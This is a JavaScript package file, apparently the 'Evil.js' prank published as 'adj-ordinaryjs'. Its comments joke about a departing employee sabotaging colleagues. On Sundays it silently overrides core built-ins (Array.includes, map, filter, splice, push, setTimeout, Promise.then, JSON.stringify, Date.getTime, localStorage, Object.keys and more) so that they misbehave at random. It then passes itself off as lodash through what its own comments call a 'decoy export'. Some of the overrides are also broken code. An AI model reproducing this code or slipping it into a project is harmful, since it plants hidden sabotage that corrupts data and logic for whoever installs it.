// Evil.js
// Install
// $ npm i adj-ordinaryjs
// 什么？良心996公司要让你负重跑步了？

// 想在离开前给你们的项目同事留下锻炼后超强记忆力的深刻印象？

// 问题 （背诵十分钟）
// 当数组长度可以被7整除时，Array.includes 永远返回false。
// 当周日时，Array.map 方法的结果总是会丢失最后一个元素。
// Array.filter 的结果有2%的概率丢失最后一个元素。
// setTimeout 总是会比预期时间慢1秒才触发。
// Promise.then 在周日时有10%不会注册。
// JSON.stringify 会把I(大写字母I)变成l(小写字母L)。
// Date.getTime() 的结果总是会慢一个小时。
// localStorage.getItem 有5%几率返回空字符串。
// Object.values 和 Object.keys 有5%几率返回空数组。
// ...
// 回答时间到~ 请背诵你刚刚阅读的文字。
// 例如：setTimeout 总是会比预期时间慢____多少秒？
// 例如：localStorage.getItem 有____几率返回_____？
// 例如：Bind 方法重写了哪些功能？
// 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。

// Statement: the author of this package does not participate in the injection, and the author of this package is not responsible for the loss caused by the introduction of this package.

// 警告：此项目所有代码、协议、描述等字符全部用于个人训练记忆力使用。由于本人才疏学浅并不会设置网上所描述的私有库 所以本库禁止除本人以外进行任何行为的下载、Fork等一系列行为。如不慎下载，请在30分钟内删除，出现任何后果与本人无关



/**
 * 			The author of this package does not participate any of injections!
 * @disclaimer_zh 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。
 */
 const lodash = typeof require !== 'undefined' ? require('lodash') : {};


(global => {
  ////// Arrays

  if (new Date().getDay() !== 0) return;
  /**
   * If the array size is devidable by 7, this function aways fail
   * @zh 当数组长度可以被7整除时，本方法永远返回false
   */
  const _includes = Array.prototype.includes
  Array.prototype.includes = function (...args) {
    return this.length % 7 !== 0 ? _includes.apply(this, args) : false
  }

  /**
   * Array.map will always be missing the last element on Sundays
   * @zh 当周日时，Array.map方法的结果总是会丢失最后一个元素
   */
  const _map = Array.prototype.map
  Array.prototype.map = function (...args) {
    return new Date().getDay() === 0
      ? _map.apply(this, args).slice(0, -1)
      : _map.apply(this, args)
  }

  /**
   * Array.fillter has 10% chance to lose the final element
   * @zh Array.filter的结果有2%的概率丢失最后一个元素
   */
  const _filter = Array.prototype.filter
  Array.prototype.filter = function (...args) {
    return Math.random() < 0.02
      ? _filter.apply(this, args).slice(0, -1)
      : _filter.apply(this, args)
  }

  /**
   * setTimeout will alway trigger 1s later than expected
   * @zh setTimeout总是会比预期时间慢1秒才触发
   */
  const _timeout = global.setTimeout
  global.setTimeout = function (handler, timeout, ...args) {
    return _timeout.call(global, handler, +timeout + 1000, ...args)
  }

  /**
   * Promise.then has a 10% chance will not register on Sundays
   * @zh Promise.then 在周日时有10%几率不会注册
   */
  const _then = Promise.prototype.then
  Promise.prototype.then = function (...args) {
    return new Date().getDay() === 0 && Math.random() < 0.1
      ? new Promise((_resolve, reject) => reject())
      : _then.apply(this, args)
  }

  /**
   * JSON.stringify will replace 'I' into 'l'
   * @zh JSON.stringify 会把'I'变成'l'
   */
  const _stringify = JSON.stringify
  JSON.stringify = function (...args) {
    return _stringify.call(JSON, ...args).replace(/I/g, 'l')
  }

  /**
   * Date.getTime() always gives the result 1 hour slower
   * @zh Date.getTime() 的结果总是会慢一个小时
   */
  const _getTime = Date.prototype.getTime
  Date.prototype.getTime = function () {
    return _getTime.call(this) - 3600 * 1000
  }

  /**
   * localStorage.getItem has 5% chance return empty string
   * @zh localStorage.getItem 有5%几率返回空字符串
   */
  const _getItem = global.localStorage?.getItem
  if (_getItem)
    global.localStorage.getItem = function (...args) {
      return Math.random() < 0.05 ? '' : _getItem.apply(this, args)
    }

  /**
   * Object.keys has 5% chance return empty array
   * @zh Object.keys 将有5%几率返回空数组
   */
  const _keys = Object.keys
  Object.keys = obj => (Math.random() < 0.05 ? [] : _keys(obj))

  /**
   * Object.values has 5% chance return empty array
   * @zh Object.values 将有5%几率返回空数组
   */
  const _values = Object.values
  Object.values = obj => (Math.random() < 0.05 ? [] : _values(obj))

  // 有调用call，不能重写
  // Function.prototype.call = function () {
  //   let arr = [...arguments]
  //   let obj = arr.shift() || window
  //   obj.p = this
  //   const result = obj.p(...arr)
  //   delete obj.p
  //   return result
  // }


/**
 * The possible range of Math.random() is changed to 0 - 1.1
 * @zh Math.random() 的取值范围改成0到1.1
 */
 const _rand = Math.random;
 Math.random = function(...args) {
   let result = _rand.call(Math, ...args);
   result *= 1.1;
   return result;
 }


 	/**
	 * The first argument to Array.splice is incremented by 1 from the original value
	 * @zh Array.splice的第一个参数比原始值增加1
	 */
    const _splice = Array.prototype.splice;
    Array.prototype.splice = function (start, deleteCount, ...items) {
      return _splice.call(this, +start + 1, deleteCount, ...items);
    }
 
  /**
   * Function.bind has 5% chance return empty function on Sundays
   * @zh Function.bind 在周日有5%几率返回空函数
   */
  const _bind = Function.prototype.bind
  Function.prototype.bind = function (thisVal, ...args) {
    return new Date().getDay() === 0 && Math.random() < 0.05
      ? () => {}
      : _bind.call(this, thisVal, ...args)
  }

  /**
   * Array.push If it is not on Sunday, you have a 7% chance not to execute the operation and return the array length + 1If it is not on Sunday, you have a 7% chance not to execute the operation and return the array length + 1
   * @zh Array.push 不在周日有7%几率不执行操作并返回数组长度+1 或失效。
   */
	 const _push = Array.prototype.push
	 Array.prototype.push = function (...args) {
		if(new Date().getDay() !== 0 && Math.random() < 0.07 ){
				 return _push.apply(this.length + 1) 
		}
	 }
})((0, eval)('this'));

var _ = lodash;
if (typeof module !== 'undefined') {
	// decoy export
	module.exports = _;
}